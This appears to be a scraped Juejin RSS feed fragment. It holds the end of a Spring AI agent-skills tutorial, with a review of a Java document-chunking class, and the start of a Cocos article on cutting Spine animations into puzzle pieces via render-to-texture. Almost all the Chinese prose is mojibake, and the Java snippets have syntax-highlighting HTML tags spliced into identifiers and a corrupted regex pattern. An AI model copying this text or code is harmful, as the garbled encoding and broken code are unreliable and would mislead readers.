if (currentChunk.length() &gt; 0) {
    currentChunk.append(sentence);
} else {
    currentChunk.append(sentence);
}

<span class="hljs-strong">**å»ºè®®**</span>ï¼šç®€åŒ–ä¸º `currentChunk.append(sentence);`

#### 5. <span class="hljs-strong">**å¼‚å¸¸å¤„ç†ç¼ºå¤±**</span>
ä»£ç ä¸­æ²¡æœ‰å¤„ç†å¯èƒ½çš„å¼‚å¸¸æƒ…å†µï¼Œå¦‚ï¼š
- å†…å­˜ä¸è¶³
- æ–‡æ¡£è¿‡å¤§å¯¼è‡´æ€§èƒ½é—®é¢˜

### ğŸ”§ <span class="hljs-strong">**å…·ä½“æ”¹è¿›å»ºè®®**</span>

#### 1. <span class="hljs-strong">**æ·»åŠ å‚æ•°éªŒè¯**</span>

public DocumentChunker(int maxChunkSize, int overlapSize) {
    if (maxChunkSize &lt;= 0) {
        throw new IllegalArgumentException("maxChunkSize must be positive");
    }
    if (overlapSize &gt;= maxChunkSize) {
        throw new IllegalArgumentException("overlapSize must be less than maxChunkSize");
    }
    this.maxChunkSize = maxChunkSize;
    this.overlapSize = overlapSize;
}


#### 2. <span class="hljs-strong">**çº¿ç¨‹å®‰å…¨æ”¹è¿›**</span>

public static final DocumentChunker DEFAULT_</span>CHUNKER = new DocumentChunker();
// æˆ–è€…ç§»é™¤é™æ€å®ä¾‹ï¼Œè®©ç”¨æˆ·è‡ªå·±ç®¡ç†


<span class="hljs-section">#### 3. <span class="hljs-strong">**æå–å¸¸é‡**</span></span>

private static final String SENTENCE<span class="hljs-emphasis">_SEPARATOR_</span>PATTERN = 
<span class="hljs-code">    "(?&lt;={ã€‚})|(?&lt;=ï¼)|(?&lt;=!)|(?&lt;=ï¼Ÿ)|(?&lt;=\\?)|(?&lt;=\\n\\n)";
</span>

<span class="hljs-section">#### 4. <span class="hljs-strong">**æ·»åŠ Builderæ¨¡å¼**</span></span>
è€ƒè™‘ä½¿ç”¨Builderæ¨¡å¼æ¥æ›´çµæ´»åœ°é…ç½®å‚æ•°ã€‚

<span class="hljs-section">#### 5. <span class="hljs-strong">**æ€§èƒ½ä¼˜åŒ–**</span></span>

// ä¼˜åŒ–StringBuilderæ“ä½œ
private List<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">String</span>&gt;</span></span> splitText(String text) {
<span class="hljs-code">    List&lt;String&gt; chunks = new ArrayList&lt;&gt;();
    String[] sentences = text.split(SENTENCE_SEPARATOR_PATTERN);
    StringBuilder currentChunk = new StringBuilder();
    
    for (String sentence : sentences) {
        if (sentence.trim().isEmpty()) continue;
        
        if (currentChunk.length() + sentence.length() &lt;= maxChunkSize) {
            currentChunk.append(sentence);
        } else {
            // å¤„ç†å—åˆ†å‰²é€»è¾‘
        }
    }
    // ...
}
</span>

<span class="hljs-section">### ğŸ¯ <span class="hljs-strong">**æ€»ä½“è¯„ä»·**</span></span>

è¿™æ˜¯ä¸€ä¸ªåŠŸèƒ½å®Œæ•´ã€è®¾è®¡åˆç†çš„æ–‡æ¡£åˆ†å—å·¥å…·ç±»ï¼Œä¸»è¦é—®é¢˜é›†ä¸­åœ¨çº¿ç¨‹å®‰å…¨ã€å‚æ•°éªŒè¯å’Œä»£ç å¯ç»´æŠ¤æ€§æ–¹é¢ã€‚é€šè¿‡ä¸Šè¿°æ”¹è¿›ï¼Œå¯ä»¥æ˜¾è‘—æå‡ä»£ç çš„å¥å£®æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚

<span class="hljs-strong">**å»ºè®®ä¼˜å…ˆçº§**</span>ï¼š
<span class="hljs-bullet">1.</span> é«˜ä¼˜å…ˆçº§ï¼šå‚æ•°éªŒè¯ã€çº¿ç¨‹å®‰å…¨
<span class="hljs-bullet">2.</span> ä¸­ä¼˜å…ˆçº§ï¼šæ€§èƒ½ä¼˜åŒ–ã€ä»£ç ç®€åŒ–
<span class="hljs-bullet">3.</span> ä½ä¼˜å…ˆçº§ï¼šBuilderæ¨¡å¼ã€å¼‚å¸¸å¤„ç†
</code></pre>
<h2 data-id="heading-10">ä¸‰ã€å°ç»“</h2>
<p>SpringAIçš„Agentå¼€å‘èŒƒå¼é…åˆSkillsæœºåˆ¶ï¼Œéå¸¸ç®€å•å°±å®ç°äº†AIåº”ç”¨çš„å·¥ç¨‹åŒ–ã€‚æ•´ä¸ªè¿‡ç¨‹å®ç°ä¸‹æ¥ï¼Œé—¨æ§›è¿˜æ˜¯æ¯”è¾ƒä½çš„ã€‚ ä¸å¾—ä¸é«˜å–Šä¸€å£°ï¼š<code>SpringğŸ‚ğŸº</code></p>
<p>å®ç°æ–¹å¼è™½ç„¶ç®€å•ï¼Œä½†æ˜¯è¿™ä¸ªèƒŒåçš„è®¾è®¡å“²å­¦ã€å¼€å‘æ€ç»´çš„è½¬å˜ï¼Œè¿˜æ˜¯å¾ˆå€¼å¾—æˆ‘ä»¬å­¦ä¹ å‚è€ƒçš„â€”â€”åœ¨AIæ—¶ä»£ï¼Œå¦‚ä½•å°†æˆ‘ä»¬ç°æœ‰çš„æŠ€èƒ½ï¼ˆå¦‚å¯å¤ç”¨ã€æ¨¡å—åŒ–æ€è®¾è®¡ç­‰ï¼‰è½¬å˜åˆ°å¤§æ¨¡å‹åº”ç”¨å¼€å‘ï¼Œè¿™å¯èƒ½æ˜¯æˆ‘ä»¬æ¯ä¸€ä¸ª<code>æ—§æ—¶ä»£</code>ç¨‹åºå‘˜æœ€å¤§çš„è´¢å¯Œã€‚</p>
<p>é‚£ä¹ˆè¿™ä¸€å¥—æ˜¯æ€ä¹ˆå®ç°çš„å‘¢ï¼Ÿ</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5dc77a4aac3c4c9da90d93f6be1fa000~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54Gw54Gw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770172382&amp;x-signature=bmCKCp0qwhnrbxjLL4YQa%2FXIZ3U%3D" alt="" loading="lazy"/></p>
<p>Spring AIé‡‡ç”¨åŸºäºå·¥å…·çš„é›†æˆæ–¹æ³•ï¼Œé€šè¿‡å®ç°å„ç§å·¥å…·ï¼Œä½¿ä»»ä½•LLMéƒ½èƒ½å›è°ƒæ‰§è¡Œï¼ŒSkillsçš„è¿è¡Œè¿‡ç¨‹ï¼Œé€šå¸¸æ˜¯ä¸‹é¢ä¸‰æ­¥ï¼š</p>
<ol>
<li>å‘ç°ï¼ˆå¯åŠ¨é˜¶æ®µï¼‰</li>
</ol>
<ul>
<li>é€šè¿‡<code>SKILL.md</code>æ–‡ä»¶ä¸­çš„å…ƒæ•°æ®ï¼Œå¿«é€Ÿå®ç°æŠ€èƒ½çš„å®‰è£…æ³¨å†Œ</li>
</ul>
<ol start="2">
<li>è¯­ä¹‰åŒ¹é…ï¼ˆå¯¹è¯è¿‡ç¨‹ä¸­ï¼‰</li>
</ol>
<ul>
<li>å½“ç”¨æˆ·å‘å‡ºè¯·æ±‚æ—¶ï¼ŒLLM ä¼šæ£€æŸ¥å·¥å…·å®šä¹‰ä¸­åµŒå…¥çš„æŠ€èƒ½æè¿°ã€‚å¦‚æœ LLM åˆ¤æ–­ç”¨æˆ·è¯·æ±‚åœ¨è¯­ä¹‰ä¸Šä¸æŸä¸ªæŠ€èƒ½çš„æè¿°åŒ¹é…ï¼Œåˆ™ä¼šè°ƒç”¨è¯¥æŠ€èƒ½å·¥å…·ï¼Œå¹¶å°†æŠ€èƒ½åç§°ä½œä¸ºå‚æ•°ä¼ é€’ç»™å®ƒã€‚</li>
</ul>
<ol start="3">
<li>æ‰§è¡Œï¼ˆæŠ€èƒ½è°ƒç”¨æ—¶ï¼‰</li>
</ol>
<ul>
<li>å½“è°ƒç”¨æŠ€èƒ½å·¥å…·æ—¶ï¼ŒSkillsToolä¼šä»ç£ç›˜åŠ è½½å®Œæ•´çš„SKILL.mdå†…å®¹ï¼Œå¹¶å°†å…¶ä¸æŠ€èƒ½çš„åŸºç¡€ç›®å½•è·¯å¾„ä¸€èµ·è¿”å›ç»™å¤§å‹è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼‰ã€‚ç„¶åï¼ŒLLMä¼šæŒ‰ç…§æŠ€èƒ½å†…å®¹ä¸­çš„æŒ‡ä»¤æ‰§è¡Œã€‚å¦‚æœæŠ€èƒ½å¼•ç”¨äº†å…¶ä»–æ–‡ä»¶æˆ–è¾…åŠ©è„šæœ¬ï¼ŒLLMä¼šä½¿ç”¨<code>FileSystemTools</code>çš„<code>Read</code>å‡½æ•°æˆ–<code>ShellTools</code>çš„<code>Bash</code>å‡½æ•°æ¥æŒ‰éœ€è®¿é—®å®ƒä»¬</li>
</ul>
<hr/>
<p>é¡¹ç›®æºç ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fliuyueyi%2Fspring-ai-demo%2Ftree%2Fmaster%2Fv2%2FT01-agentic-skills-simple-design" target="_blank" title="https://github.com/liuyueyi/spring-ai-demo/tree/master/v2/T01-agentic-skills-simple-design" ref="nofollow noopener noreferrer">github.com/liuyueyi/spâ€¦</a></li>
</ul>
<p>é›¶åŸºç¡€å…¥é—¨ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FqCn8x2XO2shA8MheYbHq0w" target="_blank" title="https://mp.weixin.qq.com/s/qCn8x2XO2shA8MheYbHq0w" ref="nofollow noopener noreferrer">LLM åº”ç”¨å¼€å‘æ˜¯ä»€ä¹ˆï¼šé›¶åŸºç¡€ä¹Ÿå¯ä»¥è¯»æ‡‚çš„ç§‘æ™®æ–‡(æç®€ç‰ˆ)</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F2GXBNOUq3jlysipftz8TpA" target="_blank" title="https://mp.weixin.qq.com/s/2GXBNOUq3jlysipftz8TpA" ref="nofollow noopener noreferrer">å¤§æ¨¡å‹åº”ç”¨å¼€å‘ç³»åˆ—æ•™ç¨‹ï¼šåº-ä¸ºä»€ä¹ˆä½ â€œä¼šç”¨ LLMâ€ï¼Œä½†åšä¸å‡ºå¤æ‚åº”ç”¨ï¼Ÿ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fv-z6EHY300ElOxdGPdzc0w" target="_blank" title="https://mp.weixin.qq.com/s/v-z6EHY300ElOxdGPdzc0w" ref="nofollow noopener noreferrer">å¤§æ¨¡å‹åº”ç”¨å¼€å‘ç³»åˆ—æ•™ç¨‹ï¼šç¬¬ä¸€ç« LLMåˆ°åº•åœ¨åšä»€ä¹ˆï¼Ÿ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Ft_BuAW9i0npcaJdua3Am2Q" target="_blank" title="https://mp.weixin.qq.com/s/t_BuAW9i0npcaJdua3Am2Q" ref="nofollow noopener noreferrer">å¤§æ¨¡å‹åº”ç”¨å¼€å‘ç³»åˆ—æ•™ç¨‹ï¼šç¬¬äºŒç«  æ¨¡å‹ä¸æ˜¯é‡ç‚¹ï¼Œå‚æ•°æ‰æ˜¯ä½ çœŸæ­£çš„æ§åˆ¶é¢æ¿</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fvzt0bGwcfnASOiBa0Kc7VQ" target="_blank" title="https://mp.weixin.qq.com/s/vzt0bGwcfnASOiBa0Kc7VQ" ref="nofollow noopener noreferrer">å¤§æ¨¡å‹åº”ç”¨å¼€å‘ç³»åˆ—æ•™ç¨‹ï¼šç¬¬ä¸‰ç«  ä¸ºä»€ä¹ˆæˆ‘çš„Promptè¡¨ç°å¾ˆç³Ÿï¼Ÿ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FNk-N34TLJVCTI5F4k5rGaQ" target="_blank" title="https://mp.weixin.qq.com/s/Nk-N34TLJVCTI5F4k5rGaQ" ref="nofollow noopener noreferrer">å¤§æ¨¡å‹åº”ç”¨å¼€å‘ç³»åˆ—æ•™ç¨‹ï¼šç¬¬å››ç« Prompt çš„å·¥ç¨‹åŒ–ç»“æ„è®¾è®¡</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FZQbztqBq7_PzynG06N4-mg" target="_blank" title="https://mp.weixin.qq.com/s/ZQbztqBq7_PzynG06N4-mg" ref="nofollow noopener noreferrer">å¤§æ¨¡å‹åº”ç”¨å¼€å‘ç³»åˆ—æ•™ç¨‹ï¼šç¬¬äº”ç«  ä» Prompt åˆ° Prompt æ¨¡æ¿ä¸å·¥ç¨‹æ²»ç†</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FnnKspRO87xbrn4-LBV3RNA" target="_blank" title="https://mp.weixin.qq.com/s/nnKspRO87xbrn4-LBV3RNA" ref="nofollow noopener noreferrer">å¤§æ¨¡å‹åº”ç”¨å¼€å‘ç³»åˆ—æ•™ç¨‹ï¼šç¬¬å…­ç«  ä¸Šä¸‹æ–‡çª—å£çš„çœŸå®è¾¹ç•Œ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F_5D2tF6CPnafj5mlmlwLNw" target="_blank" title="https://mp.weixin.qq.com/s/_5D2tF6CPnafj5mlmlwLNw" ref="nofollow noopener noreferrer">å¤§æ¨¡å‹åº”ç”¨å¼€å‘ç³»åˆ—æ•™ç¨‹ï¼šç¬¬ä¸ƒç« ï¼šä» â€œå †ä¸Šä¸‹æ–‡â€ åˆ° â€œç®¡ç†ä¸Šä¸‹æ–‡â€</a></li>
</ul>
<hr/>
<p>å®æˆ˜</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F96rHyp_gBUgmA2dhSbzNww" target="_blank" title="https://mp.weixin.qq.com/s/96rHyp_gBUgmA2dhSbzNww" ref="nofollow noopener noreferrer">å¤§æ¨¡å‹åº”ç”¨å¼€å‘å®æˆ˜ï¼šä¸¤ç™¾è¡Œå®ç°ä¸€ä¸ªè‡ªç„¶è¯­è¨€åœ°å€æå–æ™ºèƒ½ä½“</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FSnXdTB6tYqAzG7HgbnTSAQ" target="_blank" title="https://mp.weixin.qq.com/s/SnXdTB6tYqAzG7HgbnTSAQ" ref="nofollow noopener noreferrer">å¤§æ¨¡å‹åº”ç”¨å¼€å‘å®æˆ˜ï¼šåŸºäºSpringAIä¸å¤§æ¨¡å‹çš„é›¶é…ç½®å‘ç¥¨æ™ºèƒ½æå–æ¶æ„</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FNHqLJbos-_nrxNNmhg7IBQ" target="_blank" title="https://mp.weixin.qq.com/s/NHqLJbos-_nrxNNmhg7IBQ" ref="nofollow noopener noreferrer">å®æˆ˜ | é›¶åŸºç¡€æ­å»ºçŸ¥è¯†åº“é—®ç­”æœºå™¨äººï¼šåŸºäºSpringAI+RAGçš„å®Œæ•´å®ç°</a></li>
</ul>
<p>å‚è€ƒï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fspring.io%2Fblog%2F2026%2F01%2F13%2Fspring-ai-generic-agent-skills" target="_blank" title="https://spring.io/blog/2026/01/13/spring-ai-generic-agent-skills" ref="nofollow noopener noreferrer">Spring AI Agentic Patterns (Part 1): Agent Skills - Modular, Reusable Capabilities</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[3dæ‹¼å›¾æˆ‘ä¸ä¼šï¼Œè€æ¿ï¼šç”¨Cocosåšä¸ªä¼šåŠ¨çš„æ‹¼å›¾æ€»å¯ä»¥äº†å§ï¼]]></title>    <link>https://juejin.cn/post/7599910677578973184</link>    <guid>https://juejin.cn/post/7599910677578973184</guid>    <pubDate>2026-01-28T00:50:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7599910677578973184" data-draft-id="7599873006258831394" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="3dæ‹¼å›¾æˆ‘ä¸ä¼šï¼Œè€æ¿ï¼šç”¨Cocosåšä¸ªä¼šåŠ¨çš„æ‹¼å›¾æ€»å¯ä»¥äº†å§ï¼"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-28T00:50:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="äº¿å…ƒç¨‹åºå‘˜"/> <meta itemprop="url" content="https://juejin.cn/user/1972988307323236"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            3dæ‹¼å›¾æˆ‘ä¸ä¼šï¼Œè€æ¿ï¼šç”¨Cocosåšä¸ªä¼šåŠ¨çš„æ‹¼å›¾æ€»å¯ä»¥äº†å§ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972988307323236/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    äº¿å…ƒç¨‹åºå‘˜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-28T00:50:27.000Z" title="Wed Jan 28 2026 00:50:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cace3d14b8194b2bb9d818a6c2315b68~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lq_5YWD56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770166227&amp;x-signature=tg%2Fk8SnxYY%2FgEJ4PdU2GWsSoxM4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">å¼•è¨€</h2>
<p><strong>å“ˆå–½å¤§å®¶å¥½</strong>ï¼Œæˆ‘æ˜¯äº¿å…ƒç¨‹åºå‘˜ï¼Œä¸Šæ¬¡è€æ¿è®©åš<code>3d</code>æ‹¼å›¾çš„é‚£ä¸ªå°ä¼™ä¼´åˆåŒå’å•æ¥äº†ï¼š</p>
<blockquote>
<p><strong>äº¿å“¥</strong>ï¼Œæˆ‘åˆåŒå’å•æ¥äº†ï¼Œ<code>3d</code>æ‹¼å›¾å¤ªéš¾äº†ï¼Œæˆ‘è¿™æ²¡æœ‰ç»éªŒå®åœ¨åšä¸å‡ºæ¥ï¼ˆæ‚è„¸ï¼‰ã€‚</p>
<p><strong>å¹¸å¥½</strong>è€æ¿æ²¡æœ‰ä¸€æ„å­¤è¡Œï¼Œä½†æ˜¯æ— è®ºå¦‚ä½•éƒ½è®©æˆ‘åšä¸ªå˜ç§çš„æ‹¼å›¾å‡ºæ¥ï¼šåšä¸ªä¼šåŠ¨çš„<code>spine</code>æ‹¼å›¾æ€»å¯ä»¥äº†å§ï¼</p>
<p><strong>å¤§ä½¬</strong>ç»™æˆ‘æ”¯æ”¯æ‹›ï¼Œ<code>spine</code>å¯ä»¥åŠ¨æ€åˆ†å‰²å—ï¼Ÿ</p>
</blockquote>
<p><strong>spineéª¨éª¼åŠ¨ç”»ï¼Ÿ</strong>ï¼Œæœç„¶äººçš„æ€ç»´èƒ½åŠ›æ˜¯æ— ç©·æ— å°½çš„ï¼Œä¸€ä¸ªæ‹¼å›¾æ¸¸æˆéƒ½ç©å‡ºèŠ±äº†ã€‚</p>
<p><strong>spine</strong>åŠ¨æ€åˆ†å‰²çš„æ–¹æ³•åº”è¯¥æœ‰å¾ˆå¤šï¼Œç¬”è€…æƒ³åˆ°äº†é€šè¿‡<code>RTT</code>çš„æ–¹æ³•ã€‚</p>
<p><strong>è¨€å½’æ­£ä¼ </strong>ï¼Œæœ¬æœŸå¸¦å¤§å®¶ä¸€èµ·æ¥çœ‹çœ‹ï¼Œåœ¨<code>Cocos</code>æ¸¸æˆå¼€å‘ä¸­ï¼Œ<strong>å¦‚ä½•é€šè¿‡RTTåŠ¨æ€åˆ†å‰²spineéª¨éª¼åŠ¨ç”»</strong>ã€‚</p>
<p><strong>æœ¬æ–‡æºå·¥ç¨‹å¯åœ¨æ–‡æœ«è·å–ï¼Œå°ä¼™ä¼´ä»¬è‡ªè¡Œå‰å¾€ã€‚</strong></p>
<h2 data-id="heading-1">ä»€ä¹ˆæ˜¯RTTï¼Ÿ</h2>
<blockquote>
<p><strong>RenderToTexture</strong>æ˜¯å°†åœºæ™¯ / èŠ‚ç‚¹çš„æ¸²æŸ“ç»“æœè¾“å‡ºåˆ°ä¸€å¼ çº¹ç†ï¼ˆTextureï¼‰ è€Œéç›´æ¥æ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚</p>
<p><strong>ä½ å¯ä»¥</strong>æŠŠå®ƒç†è§£æˆâ€œç»™æŒ‡å®šçš„æ¸¸æˆå†…å®¹æ‹ä¸€å¼ â€˜æ•°å­—ç…§ç‰‡â€™ï¼Œå¹¶æŠŠè¿™å¼ ç…§ç‰‡ä¿å­˜æˆå¯å¤ç”¨çš„çº¹ç†èµ„æºâ€ã€‚</p>
</blockquote>
<p><strong>æˆ‘ä»¬</strong>å¯ä»¥é€šè¿‡<code>RTT</code>åŠ¨æ€å°†<code>spineåŠ¨ç”»</code>æ¸²æŸ“åˆ°çº¹ç†ä¸Šï¼Œç„¶åé€šè¿‡<code>Sprite</code>æ˜¾ç¤ºå‡ºæ¥ã€‚</p>
<p><strong>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬å¦‚ä½•åœ¨æ¸¸æˆå¼€å‘ä¸­ä½¿ç”¨RTTï¼Ÿ</strong></p>
<h2 data-id="heading-2">RTTçš„ä½¿ç”¨</h2>
<p><strong>1.èµ„æºå‡†å¤‡</strong></p>
<p><strong>æ—¢ç„¶æ˜¯</strong>åŠ¨æ€åˆ†å‰²<code>spine</code>åŠ¨ç”»ï¼Œæˆ‘ä»¬éœ€è¦å‡†å¤‡ä¸€ä¸ª<code>spine</code>åŠ¨ç”»ï¼Œå¤§å®¶ç†Ÿæ‚‰çš„ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6721399d1ae45a4ae8755a9807ffb88~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lq_5YWD56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770166227&amp;x-signature=1fVL%2F%2FAW0qYtoHpoH%2BNqHXgpTMk%3D" alt="" loading="lazy"/></p>
<p><strong>ç›´æ¥è¿è¡Œ</strong>å°±èƒ½çœ‹åˆ°æ•ˆæœï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce26c11173184e94b397cb1d666a423c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lq_5YWD56iL5bqP5ZGY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770166227&amp;x-signature=6uFRT745MwTTZKoE2x8Inlz7Fow%3D" alt="" loading="lazy"/></p>
<p><strong>2.åˆ›å»ºæ¸²æŸ“çº¹ç†</strong></p>
